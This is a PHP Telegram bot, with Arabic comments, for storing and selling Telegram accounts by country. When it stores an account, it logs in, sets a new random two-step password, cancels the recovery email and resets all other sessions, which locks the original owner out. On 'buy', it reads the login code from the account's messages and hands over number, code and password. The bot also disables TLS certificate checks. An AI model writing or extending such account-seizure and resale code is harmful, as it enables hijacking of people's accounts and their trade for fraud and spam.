<?php
require_once __DIR__ . '/vendor/autoload.php';
// bot.php - النسخة النهائية مع مكتبة libphonenumber
require __DIR__ . '/madeline.php';
require __DIR__ . '/config.php';

use danog\MadelineProto\API;
use danog\MadelineProto\Settings\AppInfo;
use danog\MadelineProto\Settings;

$db = new PDO('sqlite:' . DB_PATH);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// إنشاء جدول الدول (فارغ - سيتم ملؤه تلقائياً)
$db->exec("
CREATE TABLE IF NOT EXISTS countries (
    code TEXT PRIMARY KEY,
    name TEXT,
    flag TEXT
);
");

$db->exec("
CREATE TABLE IF NOT EXISTS accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    phone TEXT UNIQUE,
    country_code TEXT,
    session_file TEXT,
    password TEXT,
    status TEXT DEFAULT 'active',
    stored_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS activation_sessions (
    phone TEXT,
    admin_id INTEGER,
    step TEXT,
    temp_file TEXT,
    country_code TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS pending_orders (
    account_id INTEGER PRIMARY KEY,
    buyer_id INTEGER,
    requested_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
");

function botApi($method, $params) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/" . $method;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

function sendMessage($chat_id, $text, $keyboard = null) {
    $params = ['chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML'];
    if ($keyboard) $params['reply_markup'] = json_encode($keyboard);
    botApi('sendMessage', $params);
}

function editMessage($chat_id, $msg_id, $text, $keyboard = null) {
    $params = ['chat_id' => $chat_id, 'message_id' => $msg_id, 'text' => $text, 'parse_mode' => 'HTML'];
    if ($keyboard) $params['reply_markup'] = json_encode($keyboard);
    botApi('editMessageText', $params);
}

// ========== دالة التعرف على الدولة باستخدام مكتبة libphonenumber ==========
function getCountryByPhone($phone, $db) {
    if (!class_exists('libphonenumber\PhoneNumberUtil')) {
        require_once __DIR__ . '/vendor/autoload.php';
    }
    $phoneUtil = \libphonenumber\PhoneNumberUtil::getInstance();
    try {
        $number = $phoneUtil->parse($phone, null);
        $countryCode = $number->getCountryCode();
        $region = $phoneUtil->getRegionCodeForNumber($number);
        
        // إنشاء العلم من الرمز المكون من حرفين
        $flag = '';
        if (strlen($region) == 2) {
            $flag = mb_chr(127397 + ord($region[0])) . mb_chr(127397 + ord($region[1]));
        } else {
            $flag = '🏴';
        }
        
        $data = [
            'code' => (string)$countryCode,
            'name' => $region,
            'flag' => $flag
        ];
        
        // حفظ الدولة في قاعدة البيانات إذا لم تكن موجودة
        $stmt = $db->prepare("INSERT OR IGNORE INTO countries (code, name, flag) VALUES (?, ?, ?)");
        $stmt->execute([$data['code'], $data['name'], $data['flag']]);
        
        return $data;
    } catch (Exception $e) {
        return null;
    }
}
// ====================================================================

$update = json_decode(file_get_contents('php://input'), true);
if (!$update) exit;

$message = $update['message'] ?? null;
$callback = $update['callback_query'] ?? null;
$chat_id = $message['chat']['id'] ?? ($callback['message']['chat']['id'] ?? 0);
$user_id = $message['from']['id'] ?? ($callback['from']['id'] ?? 0);
$msg_id = $callback['message']['message_id'] ?? 0;

if ($user_id != ADMIN_ID) {
    if ($message) sendMessage($chat_id, "⛔ غير مصرح");
    exit;
}

if ($message && trim($message['text'] ?? '') === '/start') {
    $keyboard = [
        'inline_keyboard' => [
            [['text' => '📦 تخزين حسابات تلجرام', 'callback_data' => 'store']],
            [['text' => '🛒 جلب حسابات تلجرام', 'callback_data' => 'buy']],
            [['text' => '🌍 عرض الدول والمخزون', 'callback_data' => 'stock']]
        ]
    ];
    sendMessage($chat_id, "مرحبًا بك في بوت إدارة حسابات تيلجرام.\nاختر إحدى الخدمات:", $keyboard);
    exit;
}

if ($callback) {
    botApi('answerCallbackQuery', ['callback_query_id' => $callback['id']]);
    $data = $callback['data'];

    if ($data === 'store') {
        $tempFile = '/tmp/temp_' . uniqid();
        $db->prepare("INSERT INTO activation_sessions (admin_id, step, temp_file) VALUES (?, 'awaiting_phone', ?)")->execute([$user_id, $tempFile]);
        sendMessage($chat_id, "📱 أرسل رقم الهاتف مع رمز الدولة:\nمثال: +967XXXXXXXX");
        exit;
    }
    elseif ($data === 'buy') {
        $stmt = $db->query("SELECT country_code, COUNT(*) as cnt FROM accounts WHERE status='active' GROUP BY country_code");
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        if (!$rows) {
            sendMessage($chat_id, "📭 لا يوجد حسابات متاحة حاليًا.");
        } else {
            $buttons = [];
            foreach ($rows as $row) {
                $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
                $stmt_c->execute([$row['country_code']]);
                $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
                if (!$c) $c = ['name' => "رمز {$row['country_code']}", 'flag' => '🏴'];
                $buttons[] = [['text' => "{$c['flag']} {$c['name']} ({$row['cnt']})", 'callback_data' => "buy_country_{$row['country_code']}"]];
            }
            sendMessage($chat_id, "اختر الدولة:", ['inline_keyboard' => $buttons]);
        }
        exit;
    }
    elseif ($data === 'stock') {
        $stmt = $db->query("SELECT country_code, COUNT(*) as cnt FROM accounts WHERE status='active' GROUP BY country_code");
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        if (!$rows) {
            sendMessage($chat_id, "📭 لا يوجد حسابات في المخزون.");
        } else {
            $msg = "📊 المخزون الحالي:\n";
            foreach ($rows as $row) {
                $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
                $stmt_c->execute([$row['country_code']]);
                $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
                if (!$c) $c = ['name' => "رمز {$row['country_code']}", 'flag' => '🏴'];
                $msg .= "{$c['flag']} {$c['name']} : {$row['cnt']} حسابات\n";
            }
            sendMessage($chat_id, $msg);
        }
        exit;
    }
    elseif (preg_match('/^buy_country_(\w+)$/', $data, $match)) {
        $country_code = $match[1];
        $stmt = $db->prepare("SELECT id, phone, country_code FROM accounts WHERE country_code=? AND status='active' LIMIT 1");
        $stmt->execute([$country_code]);
        $acc = $stmt->fetch(PDO::FETCH_ASSOC);
        if (!$acc) {
            sendMessage($chat_id, "❌ لا يوجد حسابات متاحة لهذه الدولة حاليًا.");
            exit;
        }
        $db->prepare("INSERT OR REPLACE INTO pending_orders (account_id, buyer_id) VALUES (?, ?)")->execute([$acc['id'], $user_id]);
        $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
        $stmt_c->execute([$acc['country_code']]);
        $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
        if (!$c) $c = ['name' => "رمز {$acc['country_code']}", 'flag' => '🏴'];
        $msg = "📋 معلومات الحساب:\n"
             . "الدولة: {$c['flag']} {$c['name']}\n"
             . "📞 الرقم: {$acc['phone']}\n"
             . "🔑 الكود: (قيد الانتظار)\n"
             . "🕒 الساعة: " . date('Y-m-d H:i:s');
        $keyboard = ['inline_keyboard' => [[['text' => '📲 طلب الكود', 'callback_data' => "request_code_{$acc['id']}"]]]];
        sendMessage($chat_id, $msg, $keyboard);
        exit;
    }
    elseif (preg_match('/^request_code_(\d+)$/', $data, $match)) {
        $acc_id = (int)$match[1];
        $stmt = $db->prepare("SELECT id, phone, session_file, password, country_code FROM accounts WHERE id=? AND status='active'");
        $stmt->execute([$acc_id]);
        $acc = $stmt->fetch(PDO::FETCH_ASSOC);
        if (!$acc) {
            sendMessage($chat_id, "⚠️ هذا الحساب لم يعد متوفرًا.");
            exit;
        }
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        $mad = new API($acc['session_file'], $settings);
        $mad->start();
        try {
            $mad->phoneLogin($acc['phone']);
            $code = null;
            for ($i = 0; $i < 15; $i++) {
                sleep(2);
                $msgs = $mad->messages->getHistory(['limit' => 5]);
                foreach ($msgs['messages'] as $m) {
                    if (isset($m['message']) && preg_match('/\b(\d{5,6})\b/', $m['message'], $matchCode)) {
                        $code = $matchCode[1];
                        break 2;
                    }
                }
            }
            if (!$code) {
                sendMessage($chat_id, "لم نستلم الكود، حاول مجددًا.");
                exit;
            }
            $password = $acc['password'] ?? 'لا توجد كلمة مرور';
            sendMessage($chat_id, "📲 بيانات الحساب:\n📞 {$acc['phone']}\n🔑 الكود: $code\n🔐 كلمة المرور: $password");
            $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
            $stmt_c->execute([$acc['country_code']]);
            $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
            if (!$c) $c = ['name' => "رمز {$acc['country_code']}", 'flag' => '🏴'];
            $newText = "📋 معلومات الحساب:\n"
                     . "الدولة: {$c['flag']} {$c['name']}\n"
                     . "📞 الرقم: {$acc['phone']}\n"
                     . "🔑 الكود: $code\n"
                     . "🔐 كلمة السر: $password\n"
                     . "🕒 الساعة: " . date('Y-m-d H:i:s');
            $keyboard = [
                'inline_keyboard' => [
                    [['text' => '📲 طلب الكود مرة أخرى', 'callback_data' => "request_code_{$acc_id}"]],
                    [['text' => '🚪 تسجيل الخروج من الحساب', 'callback_data' => "logout_account_{$acc_id}"]]
                ]
            ];
            editMessage($chat_id, $msg_id, $newText, $keyboard);
        } catch (Exception $e) {
            sendMessage($chat_id, "❌ فشل طلب الكود: " . $e->getMessage());
        }
        exit;
    }
    elseif (preg_match('/^logout_account_(\d+)$/', $data, $match)) {
        $acc_id = (int)$match[1];
        $stmt = $db->prepare("SELECT session_file FROM accounts WHERE id=?");
        $stmt->execute([$acc_id]);
        $file = $stmt->fetchColumn();
        if ($file && file_exists($file)) {
            try {
                $settings = new Settings();
                $appInfo = new AppInfo();
                $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
                $settings->setAppInfo($appInfo);
                $mad = new API($file, $settings);
                $mad->start();
                $mad->logout();
            } catch (Exception $e) {}
            unlink($file);
        }
        $db->prepare("UPDATE accounts SET status='removed' WHERE id=?")->execute([$acc_id]);
        sendMessage($chat_id, "✅ تم تسجيل الخروج وإزالة الحساب من المخزون.");
        editMessage($chat_id, $msg_id, "🚫 هذا الحساب تم تسجيل الخروج منه ولم يعد متاحًا.");
        exit;
    }
    exit;
}

// معالجة الرسائل النصية (تخزين حساب جديد)
if ($message && !$callback) {
    $text = trim($message['text'] ?? '');
    $stmt = $db->prepare("SELECT * FROM activation_sessions WHERE admin_id=? ORDER BY created_at DESC LIMIT 1");
    $stmt->execute([$user_id]);
    $session = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($session && $session['step'] === 'awaiting_phone' && preg_match('/^\+\d+$/', $text)) {
        $phone = $text;
        $country = getCountryByPhone($phone, $db);
        if (!$country) {
            sendMessage($chat_id, "❌ لم نتعرف على الدولة من هذا الرقم. تأكد من إرسال الرقم مع رمز الدول الصحيح (مثال: +967XXXXXXXX)");
            exit;
        }
        $db->prepare("UPDATE activation_sessions SET phone=?, country_code=?, step='awaiting_code' WHERE admin_id=?")->execute([$phone, $country['code'], $user_id]);
        $tempFile = $session['temp_file'];
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        $mad = new API($tempFile, $settings);
        $mad->phoneLogin($phone);
        sendMessage($chat_id, "✅ تم إرسال كود التفعيل إلى $phone. أرسل الكود الآن:");
        exit;
    }
    elseif ($session && $session['step'] === 'awaiting_code' && is_numeric($text)) {
        $phone = $session['phone'];
        $tempFile = $session['temp_file'];
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        $mad = new API($tempFile, $settings);
        try {
            $authorization = $mad->completePhoneLogin($text);
            if ($authorization['_'] === 'account.password') {
                $db->prepare("UPDATE activation_sessions SET step='awaiting_password' WHERE admin_id=?")->execute([$user_id]);
                sendMessage($chat_id, "🔐 الحساب محمي بكلمة مرور خطوتين. أرسل كلمة المرور القديمة:");
                exit;
            }
            $newPassword = bin2hex(random_bytes(8));
            try {
                $mad->update2fa(['password' => $newPassword]);
            } catch (Exception $e) {}
            try {
                $mad->account->cancelPasswordEmail();
                $mad->account->resetAuthorization();
            } catch (Exception $e) {}
            $finalSession = '/tmp/' . md5($phone) . '.madeline';
            copy($tempFile, $finalSession);
            unlink($tempFile);
            $db->prepare("INSERT INTO accounts (phone, country_code, session_file, password, status) VALUES (?,?,?,?,'active')")
                ->execute([$phone, $session['country_code'], $finalSession, $newPassword]);
            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
            $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
            $stmt_c->execute([$session['country_code']]);
            $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
            if (!$c) $c = ['name' => "رمز {$session['country_code']}", 'flag' => '🏴'];
            sendMessage($chat_id, "🎉 تم تخزين الحساب بنجاح!\nالدولة: {$c['flag']} {$c['name']}\nكلمة المرور الجديدة: $newPassword");
        } catch (Exception $e) {
            sendMessage($chat_id, "❌ فشل التحقق من الكود: " . $e->getMessage());
        }
        exit;
    }
    elseif ($session && $session['step'] === 'awaiting_password') {
        $oldPass = $text;
        $phone = $session['phone'];
        $tempFile = $session['temp_file'];
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        $mad = new API($tempFile, $settings);
        try {
            $authorization = $mad->complete2faLogin($oldPass);
            $newPassword = bin2hex(random_bytes(8));
            try {
                $mad->update2fa(['password' => $newPassword]);
            } catch (Exception $e) {}
            try {
                $mad->account->cancelPasswordEmail();
                $mad->account->resetAuthorization();
            } catch (Exception $e) {}
            $finalSession = '/tmp/' . md5($phone) . '.madeline';
            copy($tempFile, $finalSession);
            unlink($tempFile);
            $db->prepare("INSERT INTO accounts (phone, country_code, session_file, password, status) VALUES (?,?,?,?,'active')")
                ->execute([$phone, $session['country_code'], $finalSession, $newPassword]);
            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
            $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
            $stmt_c->execute([$session['country_code']]);
            $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
            if (!$c) $c = ['name' => "رمز {$session['country_code']}", 'flag' => '🏴'];
            sendMessage($chat_id, "🎉 تم تخزين الحساب بنجاح!\nالدولة: {$c['flag']} {$c['name']}\nكلمة المرور الجديدة: $newPassword");
        } catch (Exception $e) {
            sendMessage($chat_id, "❌ كلمة المرور خاطئة: " . $e->getMessage());
        }
        exit;
    }
    else {
        sendMessage($chat_id, "⚠️ أرسل /start للبدء");
    }
}
?>